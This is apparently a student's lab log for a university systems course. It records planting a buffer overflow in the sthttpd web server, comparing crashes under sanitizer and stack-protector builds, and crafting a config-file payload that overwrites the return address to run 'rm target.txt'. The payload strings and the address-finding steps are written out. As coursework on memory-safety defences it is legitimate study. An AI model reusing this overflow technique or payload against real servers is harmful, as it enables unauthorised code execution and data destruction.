@@ -1,0 +1,293 @@
+Daniel O’Laughlin
+304467494
+Lab 3 Log and answer to #9
+
+
+
+/////////////Setting Up Gcc////////////////////////////////////////////////////////////
+In order to open a text editor I added “$ nano .bash_profile” to my home directory. 
+I then typed “PATH=/usr/local/cs/bin:$PATH” for the purpose of running the right versions of gcc.
+///////////////////////////////////////////////////////////////////////////////////////
+
+///////////////Downloading and Extracting sthttpd//////////////////////////////////////
+
+First we transferred the tarball into the seasnet server. 
+then we untarred the tarball. 
+
+	From http://www.cs.ucla.edu/classes/spring15/cs33/lab/sthttpd-2.27.0.tar.gz 
+I was able to obtain sthttpd by doing the following 
+ 
+	“$ curl -O http://www.cs.ucla.edu/classes/spring15/cs33/lab/sthttpd-2.27.0.tar.gz”. 
+
+I then typed “ls sthttpd-2.27.0.tar.gz”. 
+	In order to untag the tar ball i did the following:
+
+	$ tar -xvf sthttpd-2.27.0.tar.gz
+	$ ls 
+	sthttpd-2.27.0  sthttpd-2.27.0.tar.gz
+
+///////////////////////////////////////////////////////////////////////////////////////
+
+/////////////////Adding the Patch//////////////////////////////////////////////////////
+
+We then introduced the patch into the sthttpd­-2.27.0 file by using the ls and cd commands to 
+find it and then using the nano command to access and edit its source code.
+
+cd sthttpd-2.27.0
+cd src
+nano thttpd.c
+
+	I then changed the line “char line[10000]” to “char line[100]” and also modified the line 
+“while ( fgets( line, sizeof(line), fp ) != 	(char*) 0 )” so that is read “while ( fgets( line, 1000, fp ) != (char*) 0 )”. 
+
+then we deleted all of the already running object files by using the make clean command
+we then compiled each version of thttpd under the correct version of gcc with the 3 different compile flags specified in the spec. 
+
+In order to compile thttpd-no I did:
+	$ make clean
+    	$ make CFLAGS='-m32 -g3 -O2 -fno-inline'
+	$ mv src/thttpd src/thttpd-no 
+
+	For thttpd-as I did:
+	$ make clean
+    	$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address'
+	$ mv src/thttpd src/thttpd-as
+
+	and for thttpd-no I did:
+	$ make clean
+    	$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong'
+	$ mv src/thttpd src/thttpd-sp
+
+we then ran the program in the background. To make sure it was running we used the following code: 
+
+ $ ps -u olaughli
+    21577 ?        00:00:00 sshd
+    21579 pts/5    00:00:00 bash
+    25388 ?        00:00:00 sshd
+    25390 pts/13   00:00:00 bash
+    25590 ?        00:00:00 thttpd-sp   //this means -sp is running
+    25593 pts/5    00:00:00 ps
+
+In order to kill/shutdown the running servers I did the following
+
+$ kill -s 15 ***** 
+
+where the stars represent the address of the thing you want to kill 
+/////////////////////////////////////////////////////////////////////////////////////////
+
+
+///////Running the Server////////////////////////////////////////////////////////////////
+
+I created a config file using the “touch” command and then used to “nano” command in order to insert 
+a nonsensical string of over 100 charters in order to crash the program.
+I started the server by typing $ src/thttpd-sp -p 50000
+
+/////////////////////////////////////////////////////////////////////////////////////////
+
+
+//////////////////////////Backtraces/////////////////////////////////////////////////////
+
+The contents of my config file for each variant were as follows
+
+For -as the config file contained: all a’s
+For -sp and - no the config file contained: port=12639#allA’s
+
+The backtraces I obtained from running -as, -no, and -sp with the appropriate config file are shown below:
+
+gdb src/thttpd-as
+r -D -C config.cfg
+
+sthttpd-as backtrace 
+
+#0  0x41414141 in ?? ()
+#1  0x41414141 in ?? ()
+#2  0x41414141 in ?? ()
+#3  0x41414141 in ?? ()
+#4  0x41414141 in ?? ()
+#5  0x41414141 in ?? ()
+#6  0x41414141 in ?? ()
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x41414141 in ?? ()
+#16 0x41414141 in ?? ()
+#17 0x0a414141 in ?? ()
+#18 0x00000000 in ?? ()
+
+gdb src/thttpd-no
+r -D -C config.cfg
+
+
+Note for future reference** For -no i set a break point at line 1190 cause this was right before the crash
+	(gdb) set disassemble-next-line on
+	(gdb) break 1190 
+sthttpd-no backtrace
+
+#0  0x41414141 in ?? ()
+#1  0x41414141 in ?? ()
+#2  0x41414141 in ?? ()
+#3  0x41414141 in ?? ()
+#4  0x41414141 in ?? ()
+#5  0x41414141 in ?? ()
+#6  0x41414141 in ?? ()
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x41414141 in ?? ()
+#16 0x41414141 in ?? ()
+#17 0x41414141 in ?? ()
+#18 0x41414141 in ?? ()
+#19 0x41414141 in ?? ()
+#20 0x41414141 in ?? ()
+#21 0x41414141 in ?? ()
+#22 0x41414141 in ?? ()
+#23 0x41414141 in ?? ()
+#24 0x41414141 in ?? ()
+#25 0x41414141 in ?? ()
+#26 0x41414141 in ?? ()
+#27 0x41414141 in ?? ()
+#28 0x41414141 in ?? ()
+#29 0x41414141 in ?? ()
+#30 0x41414141 in ?? ()
+#31 0x41414141 in ?? ()
+#32 0x0a414141 in ?? ()
+#33 0x00000000 in ?? ()
+
+gdb src/thttpd-sp
+r -D -C config.cfg
+
+sthttpd-sp backtrace
+
+#0  uw_frame_state_for (context=context@entry=0xffffb9a8, 
+    fs=fs@entry=0xffffba28) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
+#1  0x00158b20 in _Unwind_Backtrace (trace=0xca1670 <backtrace_helper>, 
+    trace_argument=0xffffbb04) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
+#2  0x00ca1865 in backtrace () from /lib/libc.so.6
+#3  0x00c1274b in __libc_message () from /lib/libc.so.6
+#4  0x00ca4dad in __fortify_fail () from /lib/libc.so.6
+#5  0x00ca4d5a in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x41414141 in ?? ()
+#16 0x41414141 in ?? ()
+#17 0x41414141 in ?? ()
+#18 0x41414141 in ?? ()
+#19 0x41414141 in ?? ()
+#20 0x41414141 in ?? ()
+#21 0x41414141 in ?? ()
+#22 0x41414141 in ?? ()
+#23 0x41414141 in ?? ()
+#24 0x41414141 in ?? ()
+#25 0x41414141 in ?? ()
+#26 0x41414141 in ?? ()
+#27 0x41414141 in ?? ()
+#28 0x41414141 in ?? ()
+#29 0x41414141 in ?? ()
+#30 0x41414141 in ?? ()
+#31 0x41414141 in ?? ()
+#32 0x41414141 in ?? ()
+#33 0x41414141 in ?? ()
+#34 0x41414141 in ?? ()
+#35 0x41414141 in ?? ()
+#36 0x41414141 in ?? ()
+#37 0x41414141 in ?? ()
+#38 0x0a414141 in ?? ()
+#39 0x00000000 in ?? ()
+
+//////////////////////Building and Running the Exploit///////////////////////////////////
+
+I downloaded an application called Hex Fiend which converted text into its hexadecimal representation 
+
+I then made a text file called test.txt using the “touch” command and used “nano” to edit its contents. I typed the following into test.txt:
+	
+#max_age=rm target.txt 00000000000000000000000000000000000000000000000000000000000000000000000000000aaaaggggmmmmppppooooiiiiddddxxxxttttccccqqqqyyyy
+
+We placed a null byte immediately after target.txt to signal to the machine when the call ends.
+When running thttpd with test.txt, there will be an overflow right after the 0’s.
+The letters in test.txt were chosen arbitrarily but are strategically placed in groups of 4 because the return address is represented by 32 bits.This allows me to simply change the specific block of letters that corresponds to the return address after the program crashes.
+
+I typed the following in order to run -no under gdb:
+	gdb --args thttpd-no -p 12639 -D -C test.txt
+	run
+
+This told me that the program crashed at address 0x78787878 which corresponds to the letter block ‘xxxx’in my test.txt.
+I then found the address of the call to “rm target.txt” by typing in “p system” in gdb. The address obtained from this was 0xbe2f70 but since we are on a little endian machine I reversed the bytes so that they read 0x702fbe00.I deleted the hex representation of the block of x’s and replaced it with this address, thus changing the x’s to “p/æ”
+  
+The contents of test.txt now read
+
+#max_age=rm target.txt 00000000000000000000000000000000000000000000000000000000000000000000000000000aaaaggggmmmmppppooooiiiiddddp/æ ttttccccqqqqyyyy
+
+
+After “scp”ing this modified test file back to the linux server from Hex Fiend, I ran -no again with test.txt by typing the following:
+	gdb --args thttpd-no -p 12639 -D -C test.txt
+	run
+
+This revealed that the return address was 0x74747474.
+ 
+This told me that the next 4 bytes following 0x74747474 needed to be changed to the address of the “rm target.txt” instruction. 
+In order to obtain this value we typed the following:
+
+	(gdb) break 1190
+	(gdb) print &line
+
+This produced the following output
+
+$1 = (char (*)[100]) 0xffffc17c
+
+This is the address of the first character of the string contained in test.txt. In order to jump to the location of the beginning of the rm instruction I added 9 to this value like so: 
+Therefore I had to add 9 to this memory location to find where the ‘r’ was at. Thus I typed the following:
+	
+(gdb) x/s 0xffffc17c + 9
+
+which output “0xffffc185”. I then replaced the next 4 bytes after 0x74747474 with 0x85c1ffff.
+
+This resulted in the “cccc” letter block being changed to “Ö¡ˇˇ” resulting in test.txt containing the following:
+
+#max_age=rm target.txt 00000000000000000000000000000000000000000000000000000000000000000000000000000aaaaggggmmmmppppooooiiiiddddp/æ ttttÖ¡ˇˇqqqqyyyy
+
+I then ran -no once more with the newly modified test.txt and then typed ls.Target.txt had been deleted 
+
+
+/////////////////////////////////////////////////////////////////////////////////////////
+///////Getting the Files onto my Desktop/////////////////////////////////////////////////
+
+I typed the following in order to transfer my .s files to my desktop using the scp command:
+
+For -no
+
+ scp -r olaughli@lnxsrv.seas.ucla.edu:sthttpd-2.27.0/src/thttpd-no.s /Users/danolaughlin/Desktop
+
+For -as 
+
+scp olaughli@lnxsrv.seas.ucla.edu:sthttpd-2.27.0/src/thttpd-as.s /Users/danolaughlin/Desktop
+
+For -sp 
+
+ scp olaughli@lnxsrv.seas.ucla.edu:sthttpd-2.27.0/src/thttpd-sp.s /Users/danolaughlin/Desktop 
+
+/////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
